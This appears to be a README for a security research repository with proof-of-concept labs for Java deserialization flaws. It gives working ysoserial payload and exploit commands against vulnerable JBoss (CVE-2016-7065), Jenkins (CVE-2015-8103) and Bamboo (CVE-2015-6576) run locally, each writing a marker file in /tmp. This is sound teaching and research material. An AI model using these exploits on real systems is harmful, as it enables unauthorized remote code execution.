Here there are practical examples of the - deserialization of untrusted objects - vulnerability.

These use the ysoserial tool to generate exploits.

# Pocs

Minimal Example
---------------------------------
- Use java 8
- cd MinimalExample
- java -jar ../ysoserial-master-v0.0.5-gb617b7b-16.jar CommonsCollections6 "/tmp/exploit.sh">payload.ser 
- cp ./exploit.sh /tmp
- chmod +x /tmp/exploit.sh
- javac Employee.java
- javac DeSerializingObject.java
- java -classpath .:apache-collections-commons-collections-3.1.jar DeSerializingObject 
- You will find a file "pwned" in /tmp. This means that the attack has been completed correctly with a RCE.

JBOSS (CVE-2016-7065)
---------------------------------


- Download a vulnerable version of Jboss (in this case you can find the v5.1.0) 
- Check if you have installed the JDK 1.8
- Run jboss: java -jar ./JBoss/jboss-5.1.0.GA/bin/run.jar
- Download and open Burp: setup your proxy on localhost:9090
- In your browser start proxy on localhost:9090
- Generate the payload with ysoserial: java -jar ysoserial.jar CommonsCollections5 "touch /tmp/JbossVulnerable.txt" > JbossPayload.ser or use the payload inside the folder JBoss
- Open localhost:8080/invoker/JMXInvokerServlet
- In Burp "paste from file" and choose JbossPayload.ser
- Checkout in /tmp folder the execution of "touch /tmp/JbossVulnerable.txt"



Jenkins (CVE-2015-8103)
---------------------------------

- Download a vulnerable version of Jenkins (in this case you can find the v1.649
- Check if you have installed the JDK 1.8
- java -jar ./jenkins-war-1.649.war
- java -cp ysoserial-master-v0.0.5-gb617b7b-16.jar ysoserial.exploit.JenkinsListener http://localhost:8080 CommonsCollections5 "touch /tmp/JenkinsVulnerable.txt"



Bamboo (CVE-2015-6576)
---------------------------------

- Download and install openjdk 1.7
	sudo add-apt-repository ppa:openjdk-r/ppa  
	sudo apt-get update   
	sudo apt-get install openjdk-7-jdk  
- Download and install vulnerable version of Bamboo (v5.4.3 in this case) 
- Create folder /home/user/bamboohome/
- Add/update the property /Bamboo/atlassian-bamboo-5.4.3/atlassian-bamboo/WEB-INF/classes/bamboo-init.properties with
	bamboo.home=/home/user/bamboohome
- Get fingerprint -> localhost:8085/agentServer/GetFingerprint.action?agentType=elastic
- Generate payload with ysoserial
- Open localhost:8085/agentServer/message?fingerprint<copied fingerprint> and "copy from file" in burp
	java -jar ysoserial.jar CommonsCollections4 "touch /tmp/BambooVulnerable.txt" > BambooPayload.ser 
  or use the payload inside the folder JBoss


# Stacktraces
https://github.com/EdoardoVignati/ysoserial/tree/master/analyze

See the webpage on https://rawgit.com/EdoardoVignati/ysoserial/master/analyze/index.html

# References and readings
https://github.com/EdoardoVignati/ysoserial/blob/master/biblio.bib

Other references:

https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478

https://askubuntu.com/questions/761127/how-do-i-install-openjdk-7-on-ubuntu-16-04-or-higher


# Defenses
https://link.springer.com/chapter/10.1007/978-3-030-00470-5_21


